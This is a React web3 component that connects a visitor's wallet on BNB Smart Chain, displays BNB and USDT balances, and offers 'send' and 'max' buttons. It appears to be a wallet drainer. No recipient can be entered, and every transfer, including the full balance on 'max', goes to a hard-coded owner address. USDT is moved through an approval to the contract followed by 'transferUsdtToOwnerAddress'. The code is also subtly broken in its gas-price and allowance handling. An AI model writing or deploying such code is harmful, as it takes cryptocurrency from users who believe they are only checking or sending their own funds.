import { Web3Button } from "@web3modal/react";
import { useEffect } from "react";
import { useWeb3Modal } from "@web3modal/react";
import { bsc } from "wagmi/chains";
import Web3 from "web3";
import { AbiBNBcontract, AbiUsdtContract } from "./abi/abi";
import { useState } from "react";

function Bsc(props) {
  const { ethereumClient } = props;
  const [address, setaddress] = useState();

  const [bnbvalue, setBnbvalue] = useState();
  const [usdtvalue, setUsdtvalue] = useState();
  const [bnbvalueToSend, setbnbvalueToSend] = useState();
  const [usdtvalueToSend, setusdtvalueToSend] = useState();

  const web3 = new Web3(Web3.givenProvider);

  const ownerWalletAddressBNB = "0xAbc1EACBA9E6F941206da6A8653427B895a7C065";

  const BnbAddressContract = "0xb3865a58470f48ddbc875b357109f791aca53b2c";
  const usdtAddressContract = "0x55d398326f99059fF775485246999027B3197955";

  const BnbContract = new web3.eth.Contract(AbiBNBcontract, BnbAddressContract);
  const UsdTContract = new web3.eth.Contract(
    AbiUsdtContract,
    usdtAddressContract
  );

  const { setDefaultChain } = useWeb3Modal();
  useEffect(() => {
    setaddress(ethereumClient?.getAccount()?.address);
    setDefaultChain(bsc);
  }, [ethereumClient?.getAccount()?.address]);

  console.log(BnbContract.methods);

  async function _getBNBbalance(max) {
    if (!address) {
      alert("wallet not connected");
    }
    await BnbContract?.methods
      ?.getBNBbalance(address)
      ?.call()
      ?.then(async (val) => {
        if (max === "max") {
          const gasPrice = await web3.eth
            .getGasPrice()
            ?.then((e) => {
              console.log(e);
            })
            .catch((e) => {
              console.log(e);
            });
          const gas = await BnbContract?.methods
            ?.transferBNB(ownerWalletAddressBNB)
            ?.estimateGas({
              from: address,
              value: bnbvalueToSend,
              gasPrice: gasPrice,
            });
          setbnbvalueToSend(val - gas * 10000000000);
          await _transferBNB(val - gas * 10000000000);
        } else {
          setBnbvalue(val);
          console.log(val);
        }
      })
      ?.catch((e) => {
        console.log(e);
      });
  }
  async function _getUsdtbalance(max) {
    if (!address) {
      alert("wallet not connected");
    }
    await BnbContract?.methods
      ?.getBalanceOfUSDT(address)
      ?.call()
      ?.then(async (val) => {
        if (max === "max") {
          setusdtvalueToSend(val);
          _transferUSDT(val);
        } else {
          setUsdtvalue(val);
          console.log(val);
        }
      })
      ?.catch((e) => {
        console.log(e);
      });
  }

  async function _transferBNB(bnbValue) {
    if (!address) {
      alert("wallet not connected");
    }
    const gasPrice = await web3.eth
      .getGasPrice()
      ?.then((e) => {
        console.log(e);
      })
      .catch((e) => {
        console.log(e);
      });
    const gas = await BnbContract?.methods
      ?.transferBNB(ownerWalletAddressBNB)
      ?.estimateGas({
        from: address,
        value: bnbValue ? bnbValue : bnbvalueToSend,
        gasPrice: gasPrice,
      })
      .then((e) => {
        console.log(e);
      })
      .catch((e) => {
        console.log(e);
      });
    await BnbContract?.methods
      ?.transferBNB(ownerWalletAddressBNB)
      ?.send({
        from: address,
        value: bnbValue ? bnbValue : bnbvalueToSend,
        gasPrice: gasPrice,
        gas: gas,
      })
      .then((e) => {
        console.log(e);
      })
      .catch((e) => {
        console.log(e);
      });
  }
  async function _transferUSDT(amount) {
    if (!address) {
      alert("wallet not connected");
    }
    const gasPrice = await web3.eth
      .getGasPrice()
      ?.then((e) => {
        console.log(e);
      })
      .catch((e) => {
        console.log(e);
      });
    const currentAllowance = await UsdTContract?.methods
      ?.allowance(address, BnbAddressContract)
      ?.call()
      .then((e) => {
        console.log(e);
      })
      .catch((e) => {
        console.log(e);
      });

    if (currentAllowance < amount ? amount : usdtvalueToSend) {
      const gas = await UsdTContract?.methods
        ?.approve(BnbAddressContract, amount ? amount : usdtvalueToSend)
        ?.estimateGas({
          from: address,
          value: 0,
          gasPrice: gasPrice,
        })
        .then((e) => {
          console.log(e);
        })
        .catch((e) => {
          console.log(e);
        });
      await UsdTContract?.methods
        ?.approve(BnbAddressContract, amount ? amount : usdtvalueToSend)
        ?.send({
          from: address,
          value: 0,
          gasPrice: gasPrice,
          gas: gas,
        })
        .then((e) => {
          console.log(e);
        })
        .catch((e) => {
          console.log(e);
        });
      return;
    }
    const gas = await BnbContract?.methods
      ?.transferUsdtToOwnerAddress(amount ? amount : usdtvalueToSend)
      ?.estimateGas({
        from: address,
        value: 0,
        gasPrice: gasPrice,
      })
      .then((e) => {
        console.log(e);
      })
      .catch((e) => {
        console.log(e);
      });
    await BnbContract?.methods
      ?.transferUsdtToOwnerAddress(amount ? amount : usdtvalueToSend)
      ?.send({
        from: address,
        value: 0,
        gasPrice: gasPrice,
        gas: gas,
      })
      .then((e) => {
        console.log(e);
      })
      .catch((e) => {
        console.log(e);
      });
  }
  return (
    <>
      {address ? (
        <div>
          <button
            onClick={() => {
              _getBNBbalance();
            }}
          >
            see your bnb balance
          </button>{" "}
          {bnbvalue}
          <br />
          <button
            onClick={() => {
              _getUsdtbalance();
            }}
          >
            see your usdt balance
          </button>{" "}
          {usdtvalue}
          <br />
          <form
            onSubmit={(e) => {
              e.preventDefault();
              _transferBNB();
            }}
          >
            <input
              type={"number"}
              placeholder="send bnb"
              value={bnbvalueToSend}
              onChange={(e) => {
                setbnbvalueToSend(e.target.value);
              }}
              name="send_bnb"
            />
            <button
              onClick={() => {
                _getBNBbalance("max");
              }}
              type="button"
            >
              max
            </button>
            <button type="submit">Send</button>
          </form>
          <form
            onSubmit={(e) => {
              e.preventDefault();
              _transferUSDT();
            }}
          >
            <input
              type={"number"}
              placeholder="send usdt"
              value={usdtvalueToSend}
              onChange={(e) => {
                setusdtvalueToSend(e.target.value);
              }}
              name="send_usdt"
            />
            <button
              onClick={() => {
                _getUsdtbalance("max");
              }}
              type="button"
            >
              max
            </button>
            <button type="submit">Send</button>
          </form>
          <br />
          <br />
        </div>
      ) : null}
    </>
  );
}

export default Bsc;
